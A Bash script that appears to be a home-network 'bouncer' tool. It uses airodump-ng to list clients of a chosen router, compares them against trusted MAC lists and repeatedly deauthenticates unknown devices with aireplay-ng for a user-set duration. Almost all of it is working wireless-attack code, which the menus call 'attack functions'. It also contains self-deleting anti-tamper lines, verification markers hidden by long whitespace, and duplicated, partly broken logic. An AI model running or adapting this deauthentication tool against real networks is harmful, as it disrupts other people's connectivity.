#!/bin/bash
#Creator: David Parra-Sandoval                                                                                                                                                                     #VRF1
#Date: 11/10/2020
#Last Modified: 11/14/2020
clear

PS3="NIC? "
if [[ ${UID} -ne 0 ]]; then
	echo "Please run script as root/sudo!"
	sleep 3
	exit 1
fi

[[ -e VERIFY ]] || exit                                                                                                                                                                            #VRF6

    RELAUNCH () {
BRAND () {
router=$(cat MYROUTER)      
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.1.255 ]]; then
    SUBNET=192.168.1.1
else
    SUBNET=192.168.0.1
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.2.255 ]]; then
    SUBNET=192.168.2.1
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.11.255 ]]; then
    SUBNET=192.168.11.1
fi
ping -c 1 $SUBNET &> /dev/null && ping -c 1 nmap.org &> /dev/null
if [[ $? -ne 0 ]]; then
    exit 1
fi

    CHECKMR () {
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID24 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID24 | cut -d ":" -f2) ]] || exit 1                                                                                                                 #VRF2
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID24 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID24 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID24 | cut -d ":" -f5) ]] || exit 1
#IPTABLES lock network traffic
    }

case $router in
    Linksys) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    D-Link) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Belkin) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Asus) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Buffalo) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Netgear) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Tenda) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    TP-Link) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
esac

}
BRAND
if [[ -f $(find MAC2.4ghz/ -type f) ]] && [[ -f $(find MAC5ghz/ -type f) ]]; then
echo ""
else
    echo "No trusted MAC list present!, please check both directories."
    exit 1
fi




clear
    CHECKMR1 () {
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID5 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID5 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID5 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID5 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID5 | cut -d ":" -f5) ]] || exit 1

    }

    MYINFO () {
    local PS3="List? "
BSSID24=$(cat MYINFO | cut -d " " -f1)
CH24=$(cat MYINFO | cut -d " " -f2)
mon24ghz=$(cat MYINFO | cut -d " " -f3)
BSSID5=$(cat MYINFO | cut -d " " -f4)
CH5=$(cat MYINFO | cut -d " " -f5)
mon5ghz=$(cat MYINFO | cut -d " " -f6)
[[ -z `cat enforcer5GHz.sh | grep bouncer` ]] && exec xterm -e rm bouncer2.4_5GHz.sh VERIFY timer.sh                                                                                                       #VRF5
sed -i "s/[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*/$BSSID5/" enforcer5GHz.sh                                                                                                      #VRF3
sed -i "s/adapter/$mon5ghz/" enforcer5GHz.sh
sed -i "s/[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*/$BSSID24/" enforcer2.4GHz.sh                    
sed -i "s/adapter/$mon24ghz/" enforcer2.4GHz.sh
xterm -e sudo airodump-ng -c $CH24 --bssid $BSSID24 $mon24ghz &
xterm -e sudo airodump-ng -c $CH5 --bssid $BSSID5 $mon5ghz & 
sleep 3
killall airodump-ng
clear
echo "Now lets select the trusted MAC address list for 2.4GHz:"
select list24 in $(find MAC2.4ghz -type f ); do
    TRUST24=$list24
cat $TRUST24
echo
read -p "Use the above list:? [y/n] "
case $REPLY in
y|Y) echo "Great!";sleep 2; break ;;
n|N) echo "re-select:" ;;
*) echo "" ;;
esac
done
if [[ ! -e VERIFY ]] ; then xterm -e ./enforcer5GHz.sh; fi
echo -e "\n"
echo "Now select the trusted MAC address list for 5GHz:"
select list5 in $(find MAC5ghz -type f ); do
    TRUST5=$list5
cat $TRUST5
echo
read -p "Use the above list:? [y/n] "
case $REPLY in
y|Y) echo "Great!";sleep 2; break ;;
n|N) echo "re-select:" ;;
*) echo "" ;;
esac
done
}
MYINFO
#mon24ghz TRUST24 #mon5ghz TRUST5
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.1.255 ]]; then
    SUBNET=192.168.1.1
     MR=$(nmap  192.168.1.1 | grep -i $router | cut -d " " -f3)
else
    SUBNET=192.168.0.1
     MR=$(nmap  192.168.0.1 | grep -i $router | cut -d " " -f3)
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.2.255 ]]; then
    SUBNET=192.168.2.1
    MR=$(nmap  192.168.2.1 | grep -i $router | cut -d " " -f3)
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.11.255 ]]; then
    SUBNET=192.168.11.1
    MR=$(nmap  192.168.11.1 | grep -i $router | cut -d " " -f3)
fi
ping -c 1 $SUBNET &> /dev/null && ping -c 1 nmap.org &> /dev/null
if [[ $? -ne 0 ]]; then
    exit 1
fi
sleep 2
clear
echo
curl ifconfig.me; echo
echo -e "$router"
cat /etc/os-release /etc/lsb-release
read -t 4 -p ""
clear

[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID24 | cut -d ":" -f1) ]] || exit 1                                                                                                                             #VRF4
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID24 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID24 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID24 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID24 | cut -d ":" -f5) ]] || exit 1
    
    validate () {
xterm -e airodump-ng -c $CH24 --bssid $BSSID24 --output-format csv -w ACTUALSTATIONS24 $mon24ghz | xterm -e airodump-ng -b a -c $CH5 --bssid $BSSID5 --output-format csv -w ACTUALSTATIONS5 $mon5ghz &
sleep 16
killall airodump-ng
MACS=$(wc -l ACTUALSTATIONS24-01.csv | cut -d " " -f1)
MACSactual=$(($MACS - 5 ))
ping -c 1 $SUBNET &> /dev/null && ping -c 1 nmap.org &> /dev/null || exit 1
echo "Now validating 2.4GHz"
cat ACTUALSTATIONS24-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > validate
sleep .5
for trust in $(cat validate); do
if [[ $trust = " " ]];then
echo ""
else
echo -e "\e[92mValidating $trust\e[00m"
fi
sleep 1
done
diff -BZi validate $TRUST24 | grep "<" > realattack
echo "< HWaddress" >> realattack
sleep 1
echo -e "\e[91m"
cat realattack
echo -e "\e[00m"
echo
echo "Now validating 5GHz"
MACS=$(wc -l ACTUALSTATIONS5-01.csv | cut -d " " -f1) #VRF5
MACSactual=$(($MACS - 5 ))
cat ACTUALSTATIONS5-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > validate5ghz
sleep .5
for trust in $(cat validate5ghz); do
if [[ $trust = " " ]];then
echo ""
else
echo -e "\e[92mValidating $trust\e[00m"
fi
sleep 1
done
diff -BZi validate5ghz $TRUST5 | grep "<" > realattack5ghz
echo "< HWaddress" >> realattack5ghz
sleep 1
echo -e "\e[91m"
cat realattack5ghz
echo -e "\e[00m"

 }
                     
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID5 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID5 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID5 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID5 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID5 | cut -d ":" -f5) ]] || exit 1

    enforce4all () {

                   enforce4all2.4ghz () {
                    for deauth in $(cat realattack); do
                        
                    exec xterm -e sudo aireplay-ng --deauth 50 -a $BSSID24 -c $deauth $mon24ghz & 
                     
                    done
                
                } 
                enforce4all5ghz () {
                    for deauth in $(cat realattack5ghz); do
                        
                    exec xterm -e sudo aireplay-ng -D --deauth 50 -a $BSSID5 -c $deauth $mon5ghz & 
                      
                    done
                
                }

enforce4all2.4ghz
enforce4all5ghz
CHECKMR

}

    enforcer () {

xterm -e ./enforcer2.4GHz.sh &

xterm -e ./enforcer5GHz.sh &
    }

until [[ $ATTACKSETUP = [yY]* ]]; do
echo "This script has two attack functions that can be deployed"
echo "on to your wireless network to disconnect/deauthenticate"
echo "Unknown MAC Addresses."
echo
echo "1.) enforcer = Will execute and disconnect clients one by one."
echo
echo -e "2.) enforce4all = Will execute and disconnect all clients at 'same time'."
echo
read -p "Select method:? " METHOD
case $METHOD in
1) METHOD=enforcer
echo $METHOD will be used. ;;
2) METHOD=enforce4all
echo $METHOD will be used. ;;
*) echo "" ;;
esac
echo
read -p "How long do you want the attack to last for:? [M/H] " MH
case $MH in
m|M) read -p "How many [M]inutes:? " MINUTES
TIME=$(( 60 * $MINUTES )) ;;
h|H) read -p "How many [H]ours:? " HOURS
TIME=$(( 60 * $HOURS * 60 )) ;;
*) echo "Not valid!" ;;
esac
echo
echo "Based on the method you selected: $METHOD"
echo "How frequently should that function be executed?"
echo "Based on the attack duration you inputed: $TIME seconds"
echo "Also take into account the re-validation time period: which varies!" 
read -p "[M/H] " mh
case $mh in
m|M) read -p "How many [M]inutes:? " min
ATTACK=$(( 60 * $min )) ;;
h|H) read -p "How many [H]ours:? " hr
ATTACK=$(( 60 * $hr * 60 )) ;;
s|S) read -p "How many [S]econds:? " sec #;)
ATTACK=$sec ;;
esac
echo
echo "RECAP:"
echo "The attack duration/prolong for $TIME seconds!"
echo "$METHOD will execute every $ATTACK seconds! + re-validation!"  
read -p "Is this correct:? [y/n] " ATTACKSETUP
clear
done
#TIME=duration ATTACK=execute METHOD=type of function
sed -i "s/time/$TIME/" timer.sh
validate
xterm -e ./timer.sh &
while [[ $METHOD = enforce4all ]] ; do
for mac in $(cat realattack realattack5ghz); do
    if [[ $mac = "< | HWaddress" ]]; then
        sed -i "s/time/$TIME/" timer.sh
        CHECKMR1 && CHECKMR
    else
$METHOD
sleep $ATTACK
rm ACTUALSTATIONS5-01.csv ACTUALSTATIONS24-01.csv
validate
sed -i "s/$TIME/time/" timer.sh
fi
done
done
while [[ $METHOD = enforcer ]] ; do
for mac in $(cat realattack realattack5ghz); do
    if [[ $mac = "< | HWaddress" ]]; then
        CHECKMR1 && CHECKMR
    else
$METHOD
sleep $ATTACK
rm ACTUALSTATIONS5-01.csv ACTUALSTATIONS24-01.csv
validate
sed -i "s/$TIME/time/" timer.sh
fi
done
done

    }


if [[ -n $(ls /sys/class/net | grep "mon") ]]; then
    RELAUNCH
fi

if [[ -e MYINFO && MYROUTER ]]; then
    echo "Looks like MYINFO and MYROUTER files exist."
    echo "No need to gather that info again."
    echo "Plug in the adapter that will be used for your 2.4GHz!"
read -p "Press Enter"
clear
echo "Lets select the WiFi adapter to be used for your 2.4GHz:"
echo "enp=Ethernet wl=Wifi lo=loopback" 
select nic24 in $(ls /sys/class/net); do
    NIC24=$nic24
read -p "Use $NIC24:? [y/n] " NIC
case $NIC in
y|Y) echo "Great! $NIC24 will be used"; sleep 1
echo "Now putting $NIC24 in monitor mode"; sleep 1   
sudo airmon-ng start $NIC24 &> /dev/null
echo
#ip a | grep mon
#echo
#read -p "Input the 2.4GHzmon Name:? " mon24ghz
#echo "OK... $mon24ghz is the 2.4GHz adapter that will be used" 
#echo "to deauth 2.4GHz MACS!"
#read -p "Press Enter"; break ;;
break ;;
n|N) echo "Please re-select:" ;;
*) echo "Not valid!...only Y,y,N,n" ;;
esac
done
clear 
echo "Plug in the adapter that will be used for your 5GHz!"
read -p "Press Enter"
clear
echo "Now select the WiFi adapter to be used for your 5GHz:"
echo "enp=Ethernet wl=Wifi lo=loopback" 
select nic5 in $(ls /sys/class/net); do
    NIC5=$nic5
read -p "Use $NIC5:? [y/n] " NIC
case $NIC in
y|Y) echo "Great! $NIC5 will be used"; sleep 1
echo "Now putting $NIC5 in monitor mode"; sleep 1
sudo airmon-ng start $NIC5 &> /dev/null
echo
#ip a | grep mon
#echo
#echo "Your 2.4GHz is: $mon24ghz"
#read -p "Input the 5GHzmon Name:? " mon5ghz
#echo "OK... $mon5ghz is the 5GHz adapter that will be used" 
#echo "to deauth 5GHz MACS!"
#read -p "Press Enter"; break ;;
break ;;
n|N) echo "Please re-select:" ;;
*) echo "Not valid!...only Y,y,N,n" ;;
esac
done
fi

if [[ -n $(ls /sys/class/net | grep "mon") ]]; then
    RELAUNCH
fi
	BRAND () {
		local PS3="Brand? "
echo "Whats the brand of your router:?"
select router in Linksys D-Link Belkin Asus Buffalo Netgear Tenda TP-Link; do
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.1.255 ]]; then
	SUBNET=192.168.1.1
else
	SUBNET=192.168.0.1
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.2.255 ]]; then
    SUBNET=192.168.2.1
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.11.255 ]]; then    
    SUBNET=192.168.11.1
fi
ping -c 1 $SUBNET &> /dev/null && ping -c 1 nmap.org &> /dev/null
if [[ $? -ne 0 ]]; then
	exit 1
fi

    CHECKMR () {
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID24 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID24 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID24 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID24 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID24 | cut -d ":" -f5) ]] || exit 1
#IPTABLES lock network traffic
    }
echo $router > MYROUTER
case $router in
	Linksys) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    D-Link) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Belkin) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Asus) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Buffalo) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Netgear) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    Tenda) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
    TP-Link) nmap -O $SUBNET | grep -i $router ; if [[ $? = 0 ]]; then 
    break
     else exit 1
     fi
    ;;
esac
done
}
BRAND
if [[ -f $(find MAC2.4ghz/ -type f) ]] && [[ -f $(find MAC5ghz/ -type f) ]]; then
echo ""
else
	echo "No trusted MAC list present!, please check both directories." 
	exit 1
fi

while [[ ${UID} = 0 ]]; do
echo "This script will deauthenticate unknown MAC addresses"
echo "from both your 2.4GHz & 5GHz AP/Router simultaneously!"
echo "In order for this script to work properly it requires:"
echo "Two WiFi adapters that are capable of packet injection"
echo "and one WiFi adapter connected to your WiFi AP/Router"
echo "or utilizing ethernet. Note! the obvious is having.."
echo "the two WiFi adapter with packet injection to One being"
echo "able to access the 5GHz band."
echo
echo "RECAP:SETUP="
echo "3 WiFi adapters= 1 connected to your AP/Router.               "
echo -e "              1 capable of packet injection on 2.4GHz band."
echo -e "              1 capable of packet injection on 5GHz band.  "
echo
echo -e "                     OR"
echo
echo "2 WiFi adapters= 1 capable of packet injection on 2.4GHz band."
echo -e "              1 capable of packet injection on 5GHz band.  "
echo -e "              While connected via Ethernet to AP/Router.   "
echo
read -p "Do you meet the requirements!:? [y/n] " REQUIREMENTS
clear
case $REQUIREMENTS in
y|Y) break ;;
n|N) exit 1 ;;
*) echo "Only Y,y,N,n"
sleep 3; clear
esac
done
echo "Plug in the adapter that will be used for your 2.4GHz!" 
read -p "Press Enter"
clear
echo "Lets select the WiFi adapter to be used for your 2.4GHz:"
echo "enp=Ethernet wl=Wifi lo=loopback" 
select nic24 in $(ls /sys/class/net); do
	NIC24=$nic24
read -p "Use $NIC24:? [y/n] " NIC
case $NIC in
y|Y) echo "Great! $NIC24 will be used"; sleep 2
echo "Now putting $NIC24 in monitor mode"; sleep 1
sudo airmon-ng start $NIC24 &> /dev/null
echo
ip a | grep mon
echo
read -p "Input the 2.4GHzmon Name:? " mon24ghz
echo "OK... $mon24ghz is the 2.4GHz adapter that will be used" 
echo "to deauth 2.4GHz MACS!"
read -p "Press Enter"; break ;;
n|N) echo "Please re-select:" ;;
*) echo "Not valid!...only Y,y,N,n" ;;
esac
done
clear 
echo "Plug in the adapter that will be used for your 5GHz!"
read -p "Press Enter"
clear
echo "Now select the WiFi adapter to be used for your 5GHz:"
echo "enp=Ethernet wl=Wifi lo=loopback" 
select nic5 in $(ls /sys/class/net); do
	NIC5=$nic5
read -p "Use $NIC5:? [y/n] " NIC           
case $NIC in
y|Y) echo "Great! $NIC5 will be used"; sleep 2
echo "Now putting $NIC5 in monitor mode"; sleep 1
sudo airmon-ng start $NIC5 &> /dev/null
echo
ip a | grep mon
echo
echo "Your 2.4GHz is: $mon24ghz"
read -p "Input the 5GHzmon Name:? " mon5ghz
echo "OK... $mon5ghz is the 5GHz adapter that will be used" 
echo "to deauth 5GHz MACS!"
read -p "Press Enter"; break ;;
n|N) echo "Please re-select:" ;;
*) echo "Not valid!...only Y,y,N,n" ;;
esac
done
clear
    CHECKMR1 () {
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID5 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID5 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID5 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID5 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID5 | cut -d ":" -f5) ]] || exit 1

    }

	MYINFO () {
	local PS3="List? "
echo "Lets gather the necessary info about your AP/Router:"
echo -e "Remember press \e[91mSPACEBAR\e[00m to pause airodump-ng."
echo "Dont close any terminal/Auto close after info input is gathered."
read -p "Press Enter"
until [[ $REPLY = [yY]* ]]; do
clear
xterm -e sudo airodump-ng --band bg $mon24ghz &
read -p "My 2.4GHz BSSID: " BSSID24
read -p "Channel: " CH24
echo
xterm -e sudo airodump-ng --band a $mon5ghz &
read -p "My 5GHz BSSID: " BSSID5
read -p "Channel: " CH5
echo
echo "My Info:"
echo -e "2.4GHz= $BSSID24 CH= $CH24\n"
echo -e "5GHz= $BSSID5 CH= $CH5\n"
read -p "Is the info correct:? [y/n] "
done
sed -i "s/[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*/$BSSID5/" enforcer5GHz.sh					
sed -i "s/adapter/$mon5ghz/" enforcer5GHz.sh
sed -i "s/[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*:[0-9|A-Z]*/$BSSID24/" enforcer2.4GHz.sh					
sed -i "s/adapter/$mon24ghz/" enforcer2.4GHz.sh
killall airodump-ng
xterm -e sudo airodump-ng -c $CH24 --bssid $BSSID24 $mon24ghz &
xterm -e sudo airodump-ng -c $CH5 --bssid $BSSID5 $mon5ghz & 
sleep 3
killall airodump-ng
clear
echo "Now lets select the trusted MAC address list for 2.4GHz:"
select list24 in $(find MAC2.4ghz -type f ); do
	TRUST24=$list24
cat $TRUST24
echo
read -p "Use the above list:? [y/n] "
case $REPLY in
y|Y) echo "Great!";sleep 2; break ;;
n|N) echo "re-select:" ;;
*) echo "" ;;
esac
done
echo -e "\n"
echo "Now select the trusted MAC address list for 5GHz:"
select list5 in $(find MAC5ghz -type f ); do
	TRUST5=$list5
cat $TRUST5
echo
read -p "Use the above list:? [y/n] "
case $REPLY in
y|Y) echo "Great!";sleep 2; break ;;
n|N) echo "re-select:" ;;
*) echo "" ;;
esac
done
}
MYINFO
#mon24ghz TRUST24 #mon5ghz TRUST5
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.1.255 ]]; then
	SUBNET=192.168.1.1
     MR=$(nmap  192.168.1.1 | grep -i $router | cut -d " " -f3)
else
	SUBNET=192.168.0.1
     MR=$(nmap  192.168.0.1 | grep -i $router | cut -d " " -f3)
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.2.255 ]]; then  
    SUBNET=192.168.2.1
    MR=$(nmap  192.168.2.1 | grep -i $router | cut -d " " -f3)
fi
if [[ $(ip a | grep dynamic | cut -d " " -f 8) = 192.168.11.255 ]]; then
    SUBNET=192.168.11.1
    MR=$(nmap  192.168.11.1 | grep -i $router | cut -d " " -f3)
fi
ping -c 1 $SUBNET &> /dev/null && ping -c 1 nmap.org &> /dev/null
if [[ $? -ne 0 ]]; then
	exit 1
fi
sleep 2
clear
echo
curl ifconfig.me; echo
echo -e "$router"
cat /etc/os-release /etc/lsb-release
read -t 4 -p ""
clear
echo $BSSID24 $CH24 $mon24ghz $BSSID5 $CH5 $mon5ghz > MYINFO
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID24 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID24 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID24 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID24 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID24 | cut -d ":" -f5) ]] || exit 1
[[ -e enforcer2.4GHz.sh && -e enforcer5GHz.sh ]] || exec xterm -e rm bouncer2.4_5GHz.sh VERIFY timer.sh                                                                                           	
	validate () {
xterm -e airodump-ng -c $CH24 --bssid $BSSID24 --output-format csv -w ACTUALSTATIONS24 $mon24ghz | xterm -e airodump-ng -b a -c $CH5 --bssid $BSSID5 --output-format csv -w ACTUALSTATIONS5 $mon5ghz &
sleep 16
killall airodump-ng
MACS=$(wc -l ACTUALSTATIONS24-01.csv | cut -d " " -f1)
MACSactual=$(($MACS - 5 ))
ping -c 1 $SUBNET &> /dev/null && ping -c 1 nmap.org &> /dev/null || exit 1
echo "Now validating 2.4GHz"
cat ACTUALSTATIONS24-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > validate
sleep .5
for trust in $(cat validate); do
if [[ $trust = " " ]];then
echo ""
else
echo -e "\e[92mValidating $trust\e[00m"
fi
sleep 1
done
diff -BZi validate $TRUST24 | grep "<" > realattack
echo "< HWaddress" >> realattack
sleep 1
echo -e "\e[91m"
cat realattack
echo -e "\e[00m"
echo 
echo "Now validating 5GHz"
MACS=$(wc -l ACTUALSTATIONS5-01.csv | cut -d " " -f1)
MACSactual=$(($MACS - 5 ))
cat ACTUALSTATIONS5-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > validate5ghz
sleep .5
for trust in $(cat validate5ghz); do
if [[ $trust = " " ]];then
echo ""
else
echo -e "\e[92mValidating $trust\e[00m"
fi
sleep 1
done
diff -BZi validate5ghz $TRUST5 | grep "<" > realattack5ghz
echo "< HWaddress" >> realattack5ghz
sleep 1
echo -e "\e[91m"
cat realattack5ghz
echo -e "\e[00m"

 }
                     
[[ $(echo $MR | cut -d ":" -f1) = $(echo $BSSID5 | cut -d ":" -f1) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f2) = $(echo $BSSID5 | cut -d ":" -f2) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f3) = $(echo $BSSID5 | cut -d ":" -f3) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f4) = $(echo $BSSID5 | cut -d ":" -f4) ]] || exit 1
[[ $(echo $MR | cut -d ":" -f5) = $(echo $BSSID5 | cut -d ":" -f5) ]] || exit 1
[[ -z `cat enforcer2.4GHz.sh | grep bouncer` ]] && exec xterm -e rm bouncer2.4_5GHz.sh VERIFY timer.sh
	enforce4all () {

                   enforce4all2.4ghz () {
                    for deauth in $(cat realattack); do
                    	
                    exec xterm -e sudo aireplay-ng --deauth 50 -a $BSSID24 -c $deauth $mon24ghz &
                     
                    done
                
                } 
                enforce4all5ghz () {
                    for deauth in $(cat realattack5ghz); do
                    	
                    exec xterm -e sudo aireplay-ng -D --deauth 50 -a $BSSID5 -c $deauth $mon5ghz &
                      
                    done
                
                }

enforce4all2.4ghz
enforce4all5ghz
CHECKMR

}

	enforcer () {

xterm -e ./enforcer2.4GHz.sh &

xterm -e ./enforcer5GHz.sh &
	}

until [[ $ATTACKSETUP = [yY]* ]]; do
echo "This script has two attack functions that can be deployed"
echo "on to your wireless network to disconnect/deauthenticate"
echo "Unknown MAC Addresses."
echo
echo "1.) enforcer = Will execute and disconnect clients one by one."
echo
echo -e "2.) enforce4all = Will execute and disconnect all clients at 'same time'."
echo
read -p "Select method:? " METHOD
case $METHOD in
1) METHOD=enforcer
echo $METHOD will be used. ;;
2) METHOD=enforce4all
echo $METHOD will be used. ;;
*) echo "" ;;
esac
echo
read -p "How long do you want the attack to last for:? [M/H] " MH
case $MH in
m|M) read -p "How many [M]inutes:? " MINUTES
TIME=$(( 60 * $MINUTES )) ;;
h|H) read -p "How many [H]ours:? " HOURS
TIME=$(( 60 * $HOURS * 60 )) ;;
*) echo "Not valid!" ;;
esac
echo
echo "Based on the method you selected: $METHOD"
echo "How frequently should that function be executed?"
echo "Based on the attack duration you inputed: $TIME seconds"
echo "Also take into account the re-validation time period: which varies!"
read -p "[M/H] " mh
case $mh in
m|M) read -p "How many [M]inutes:? " min
ATTACK=$(( 60 * $min )) ;;
h|H) read -p "How many [H]ours:? " hr
ATTACK=$(( 60 * $hr * 60 )) ;;
s|S) read -p "How many [S]econds:? " sec #;)
ATTACK=$sec ;;
esac
echo
echo "RECAP:"
echo "The attack duration/prolong for $TIME seconds!"
echo "$METHOD will execute every $ATTACK seconds! + re-validation!" 
read -p "Is this correct:? [y/n] " ATTACKSETUP
clear
done
if [[ ! -e VERIFY ]] ; then xterm -e ./enforcer2.4GHz.sh ; fi
#TIME=duration ATTACK=execute METHOD=type of function
sed -i "s/time/$TIME/" timer.sh
validate
xterm -e ./timer.sh &
while [[ $METHOD = enforce4all ]] ; do
for mac in $(cat realattack realattack5ghz); do
	if [[ $mac = "< | HWaddress" ]]; then
		sed -i "s/time/$TIME/" timer.sh
        CHECKMR1 && CHECKMR
	else
$METHOD
sleep $ATTACK
rm ACTUALSTATIONS5-01.csv ACTUALSTATIONS24-01.csv
validate
sed -i "s/$TIME/time/" timer.sh
fi
done
done
while [[ $METHOD = enforcer ]] ; do
for mac in $(cat realattack realattack5ghz); do
	if [[ $mac = "< | HWaddress" ]]; then
		CHECKMR1 && CHECKMR
	else
$METHOD
sleep $ATTACK
rm ACTUALSTATIONS5-01.csv ACTUALSTATIONS24-01.csv
validate
sed -i "s/$TIME/time/" timer.sh
fi
done
done
